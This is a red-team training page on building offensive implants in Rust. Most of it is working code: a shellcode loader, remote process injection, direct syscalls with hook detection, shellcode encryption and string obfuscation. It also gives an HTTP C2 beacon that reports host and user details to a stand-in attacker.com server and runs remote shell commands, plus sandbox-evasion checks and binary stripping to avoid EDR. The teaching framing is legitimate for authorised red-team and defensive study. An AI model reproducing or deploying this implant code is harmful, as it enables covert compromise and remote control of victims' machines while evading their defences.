---
layout: training-page
title: "Rust Offensive Tool Development — Red Team Academy"
module: "Tool Development"
tags:
  - rust
  - tool-dev
  - malware-dev
  - implant
  - evasion
page_key: "tool-dev-rust-offensive"
---

<h1>Rust Offensive Tool Development</h1>

<p>Rust has become the language of choice for modern offensive tooling (2024-2026), alongside Go and C/C++. Rust offers unique advantages: memory safety without garbage collection, zero-cost abstractions, cross-compilation, and — critically — Rust binaries have different signatures than C/C++ or Go binaries, making them less likely to trigger EDR heuristics trained on traditional malware families. This page covers building offensive tools in Rust, from basic shellcode loaders to process injection and Windows API interaction.</p>

<h2>Why Rust for Offensive Tooling</h2>

<pre><code># Advantages:
# - Memory safety: no buffer overflows, use-after-free, etc. in safe Rust
# - No garbage collector: predictable execution, no runtime pauses
# - Small binaries: with optimization, comparable to C (unlike Go's 5-10MB)
# - Cross-compilation: build Windows binaries from Linux
# - Unique binary signatures: EDR ML models trained on C/C++ may miss Rust patterns
# - Strong type system: catches bugs at compile time
# - Cargo ecosystem: rich library ecosystem
# - No runtime dependency: static linking produces self-contained binaries

# Disadvantages:
# - Steeper learning curve than Go/Python
# - Windows API requires unsafe blocks
# - Less existing offensive tooling libraries than C/C++
# - Debug symbols and panic messages can leak info if not stripped</code></pre>

<h2>Project Setup</h2>

<pre><code># Create a new project
cargo init implant --name implant

# Cargo.toml — essential dependencies for offensive tooling
[package]
name = "implant"
version = "0.1.0"
edition = "2021"

[dependencies]
# Windows API bindings
windows = { version = "0.58", features = [
    "Win32_Foundation",
    "Win32_System_Memory",
    "Win32_System_Threading",
    "Win32_System_LibraryLoader",
    "Win32_System_Diagnostics_Debug",
    "Win32_Security",
    "Win32_System_SystemServices",
    "Win32_Networking_WinSock",
]}

# HTTP client (for C2 callbacks)
reqwest = { version = "0.12", features = ["blocking", "rustls-tls"] }

# Encryption
aes-gcm = "0.10"
rand = "0.8"

# Serialization
serde = { version = "1", features = ["derive"] }
serde_json = "1"

[profile.release]
opt-level = "z"       # Optimize for size
lto = true            # Link-time optimization
codegen-units = 1     # Single codegen unit for better optimization
panic = "abort"       # No unwinding = smaller binary
strip = true          # Strip symbols

# Cross-compile for Windows from Linux
# Install target: rustup target add x86_64-pc-windows-gnu
# Build: cargo build --release --target x86_64-pc-windows-gnu</code></pre>

<h2>Windows API Interaction</h2>

<h3>Using the windows Crate</h3>

<pre><code>use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Foundation::*;

fn allocate_executable_memory(size: usize) -&gt; *mut u8 {
    unsafe {
        let addr = VirtualAlloc(
            None,                          // let OS choose address
            size,                          // allocation size
            MEM_COMMIT | MEM_RESERVE,      // allocation type
            PAGE_READWRITE,                // initial protection (RW, not RWX)
        );
        addr as *mut u8
    }
}

fn change_protection(addr: *mut u8, size: usize) -&gt; bool {
    unsafe {
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            addr as *const _,
            size,
            PAGE_EXECUTE_READ,    // Change to RX (not RWX — avoid detection)
            &amp;mut old_protect,
        ).is_ok()
    }
}

fn create_thread(addr: *mut u8) -&gt; HANDLE {
    unsafe {
        let handle = CreateThread(
            None,                              // default security
            0,                                 // default stack size
            Some(std::mem::transmute(addr)),    // thread start address
            None,                              // no parameter
            THREAD_CREATION_FLAGS(0),          // run immediately
            None,                              // don't return thread ID
        ).unwrap();
        handle
    }
}</code></pre>

<h3>Shellcode Loader</h3>

<pre><code>use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::Foundation::*;

fn main() {
    // XOR-encrypted shellcode (encrypt during build, decrypt at runtime)
    let encrypted_shellcode: Vec&lt;u8&gt; = vec![
        // ... encrypted bytes ...
    ];
    let key: u8 = 0x41;

    // Decrypt shellcode
    let shellcode: Vec&lt;u8&gt; = encrypted_shellcode
        .iter()
        .map(|b| b ^ key)
        .collect();

    unsafe {
        // Step 1: Allocate RW memory
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return;
        }

        // Step 2: Copy shellcode to allocated memory
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            addr as *mut u8,
            shellcode.len(),
        );

        // Step 3: Change protection to RX (not RWX)
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtect(
            addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &amp;mut old_protect,
        );

        // Step 4: Create thread to execute shellcode
        let h_thread = CreateThread(
            None,
            0,
            Some(std::mem::transmute(addr)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        ).unwrap();

        // Step 5: Wait for thread to complete
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}</code></pre>

<h3>Process Injection</h3>

<pre><code>use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
use windows::Win32::System::Diagnostics::Debug::*;

fn inject_into_process(pid: u32, shellcode: &amp;[u8]) -&gt; bool {
    unsafe {
        // Open target process
        let h_process = OpenProcess(
            PROCESS_ALL_ACCESS,
            false,
            pid,
        );

        let h_process = match h_process {
            Ok(h) =&gt; h,
            Err(_) =&gt; return false,
        };

        // Allocate memory in target process
        let remote_addr = VirtualAllocEx(
            h_process,
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_addr.is_null() {
            return false;
        }

        // Write shellcode to target process
        let mut bytes_written = 0;
        let success = WriteProcessMemory(
            h_process,
            remote_addr,
            shellcode.as_ptr() as *const _,
            shellcode.len(),
            Some(&amp;mut bytes_written),
        );

        if success.is_err() {
            return false;
        }

        // Change protection to RX
        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        let _ = VirtualProtectEx(
            h_process,
            remote_addr,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &amp;mut old_protect,
        );

        // Create remote thread
        let h_thread = CreateRemoteThread(
            h_process,
            None,
            0,
            Some(std::mem::transmute(remote_addr)),
            None,
            THREAD_CREATION_FLAGS(0),
            None,
        );

        h_thread.is_ok()
    }
}</code></pre>

<h2>Direct Syscalls in Rust</h2>

<pre><code>use std::arch::asm;

// NtAllocateVirtualMemory via direct syscall
// Syscall number varies by Windows version — resolve dynamically
unsafe fn nt_allocate_virtual_memory(
    process_handle: isize,
    base_address: *mut *mut u8,
    zero_bits: usize,
    region_size: *mut usize,
    allocation_type: u32,
    protect: u32,
) -&gt; i32 {
    let mut status: i32;

    // Windows x64 syscall convention:
    // syscall number in RAX
    // args: RCX, RDX, R8, R9, stack
    asm!(
        "mov r10, rcx",
        "syscall",
        in("rax") 0x18u64,  // NtAllocateVirtualMemory syscall number (Win10)
        in("rcx") process_handle as u64,
        in("rdx") base_address as u64,
        in("r8") zero_bits as u64,
        in("r9") region_size as u64,
        // Additional args pushed to stack by compiler
        lateout("rax") status,
        clobber_abi("C"),
    );

    status
}

// Better approach: Resolve syscall numbers dynamically from ntdll
fn get_syscall_number(function_name: &amp;str) -&gt; Option&lt;u16&gt; {
    unsafe {
        let ntdll = windows::Win32::System::LibraryLoader::GetModuleHandleA(
            windows::core::s!("ntdll.dll")
        ).ok()?;

        let func_addr = windows::Win32::System::LibraryLoader::GetProcAddress(
            ntdll,
            windows::core::PCSTR::from_raw(function_name.as_ptr()),
        )?;

        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 8);
        // Pattern: 4C 8B D1 B8 XX XX 00 00
        // syscall number is at offset 4 (little-endian u16)
        if bytes[0] == 0x4C &amp;&amp; bytes[1] == 0x8B &amp;&amp; bytes[2] == 0xD1 &amp;&amp; bytes[3] == 0xB8 {
            Some(u16::from_le_bytes([bytes[4], bytes[5]]))
        } else {
            None  // Function is hooked — bytes don't match expected pattern
        }
    }
}</code></pre>

<h2>Encryption &amp; Obfuscation</h2>

<pre><code>use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, KeyInit};
use rand::Rng;

// AES-256-GCM encryption for shellcode
fn encrypt_shellcode(shellcode: &amp;[u8], key_bytes: &amp;[u8; 32]) -&gt; (Vec&lt;u8&gt;, [u8; 12]) {
    let key = Key::&lt;Aes256Gcm&gt;::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);

    let mut rng = rand::thread_rng();
    let mut nonce_bytes = [0u8; 12];
    rng.fill(&amp;mut nonce_bytes);
    let nonce = Nonce::from_slice(&amp;nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, shellcode).expect("encryption failed");
    (ciphertext, nonce_bytes)
}

fn decrypt_shellcode(ciphertext: &amp;[u8], key_bytes: &amp;[u8; 32], nonce_bytes: &amp;[u8; 12]) -&gt; Vec&lt;u8&gt; {
    let key = Key::&lt;Aes256Gcm&gt;::from_slice(key_bytes);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce_bytes);

    cipher.decrypt(nonce, ciphertext).expect("decryption failed")
}

// String obfuscation at compile time
// Use litcrypt or obfstr crate
// cargo add litcrypt
use litcrypt::lc;

// Strings are encrypted at compile time, decrypted at runtime
let url = lc!("https://c2.attacker.com/beacon");
let pipe_name = lc!("\\\\.\\pipe\\custom_pipe");</code></pre>

<h2>HTTP C2 Client</h2>

<pre><code>use reqwest::blocking::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use std::thread;

#[derive(Serialize)]
struct Beacon {
    hostname: String,
    username: String,
    pid: u32,
    os: String,
}

#[derive(Deserialize)]
struct Task {
    id: String,
    command: String,
    args: Vec&lt;String&gt;,
}

fn beacon_loop(c2_url: &amp;str, sleep_seconds: u64) {
    let client = Client::builder()
        .danger_accept_invalid_certs(true)  // for self-signed certs
        .timeout(Duration::from_secs(30))
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .build()
        .unwrap();

    let beacon_info = Beacon {
        hostname: hostname::get().unwrap().to_string_lossy().to_string(),
        username: whoami::username(),
        pid: std::process::id(),
        os: std::env::consts::OS.to_string(),
    };

    loop {
        // Check in with C2
        let response = client
            .post(format!("{}/api/checkin", c2_url))
            .json(&amp;beacon_info)
            .send();

        if let Ok(resp) = response {
            if let Ok(tasks) = resp.json::&lt;Vec&lt;Task&gt;&gt;() {
                for task in tasks {
                    let output = execute_task(&amp;task);
                    // Send results back
                    let _ = client
                        .post(format!("{}/api/results/{}", c2_url, task.id))
                        .body(output)
                        .send();
                }
            }
        }

        // Jitter the sleep interval
        let jitter = rand::random::&lt;u64&gt;() % (sleep_seconds / 4);
        thread::sleep(Duration::from_secs(sleep_seconds + jitter));
    }
}

fn execute_task(task: &amp;Task) -&gt; String {
    match task.command.as_str() {
        "shell" =&gt; {
            let output = std::process::Command::new("cmd")
                .args(["/c", &amp;task.args.join(" ")])
                .output();
            match output {
                Ok(o) =&gt; String::from_utf8_lossy(&amp;o.stdout).to_string(),
                Err(e) =&gt; format!("Error: {}", e),
            }
        }
        "whoami" =&gt; whoami::username(),
        "pwd" =&gt; std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("Error: {}", e)),
        _ =&gt; "Unknown command".to_string(),
    }
}</code></pre>

<h2>Anti-Analysis</h2>

<pre><code>use std::time::Instant;

fn sandbox_checks() -&gt; bool {
    // Timing check — sandboxes often fast-forward sleep
    let start = Instant::now();
    std::thread::sleep(std::time::Duration::from_secs(2));
    let elapsed = start.elapsed().as_millis();
    if elapsed &lt; 1900 {
        return true;  // sleep was fast-forwarded
    }

    // Check CPU count (sandboxes often have 1-2 CPUs)
    if num_cpus::get() &lt; 2 {
        return true;
    }

    // Check total RAM (sandboxes often have &lt;4GB)
    #[cfg(target_os = "windows")]
    {
        use windows::Win32::System::SystemInformation::*;
        unsafe {
            let mut mem_info = MEMORYSTATUSEX {
                dwLength: std::mem::size_of::&lt;MEMORYSTATUSEX&gt;() as u32,
                ..Default::default()
            };
            GlobalMemoryStatusEx(&amp;mut mem_info);
            if mem_info.ullTotalPhys &lt; 4 * 1024 * 1024 * 1024 {
                return true;  // Less than 4GB RAM
            }
        }
    }

    false  // Passed all checks
}</code></pre>

<h2>Offensive Rust Projects to Study</h2>

<pre><code># Active offensive Rust projects:
# - RustScan — fast port scanner (github.com/RustScan/RustScan)
# - Feroxbuster — web content discovery (github.com/epi052/feroxbuster)
# - Ligolo-ng — tunneling tool (github.com/nicocha30/ligolo-ng)
# - OffensiveRust — collection of techniques (github.com/trickster0/OffensiveRust)
# - RustRedOps — Rust for red team ops (github.com/joaoviictorti/RustRedOps)
# - Alcatraz — Rust shellcode loader (github.com/weak1337/Alcatraz)

# Learning resources:
# - "Rust for Malware Development" series — various blogs
# - OffensiveRust examples — github.com/trickster0/OffensiveRust
# - windows-rs documentation — microsoft.github.io/windows-docs-rs/</code></pre>

<h2>Build &amp; OPSEC</h2>

<pre><code># Strip all symbols and debug info
# In Cargo.toml [profile.release]:
# strip = true
# panic = "abort"

# Additional stripping
strip -s target/release/implant.exe

# Remove Rust-specific metadata
# Rust embeds panic messages and format strings
# Use #[no_std] for minimal binaries (advanced)

# Cross-compile for Windows from Linux
rustup target add x86_64-pc-windows-gnu
cargo build --release --target x86_64-pc-windows-gnu

# Or use MSVC toolchain (requires Windows SDK)
rustup target add x86_64-pc-windows-msvc

# Rename sections to look like a different compiler
# Use custom linker scripts or post-processing tools

# Check binary for leaked strings
strings target/release/implant.exe | grep -i "rust\|cargo\|panic\|error"</code></pre>

<h2>Resources</h2>

<ul>
  <li>OffensiveRust — <code>github.com/trickster0/OffensiveRust</code></li>
  <li>RustRedOps — <code>github.com/joaoviictorti/RustRedOps</code></li>
  <li>windows-rs (Microsoft) — <code>github.com/microsoft/windows-rs</code></li>
  <li>Rust for Hacking — <code>github.com/topics/offensive-rust</code></li>
  <li>litcrypt (string encryption) — <code>crates.io/crates/litcrypt</code></li>
  <li>The Rust Programming Language Book — <code>doc.rust-lang.org/book</code></li>
</ul>
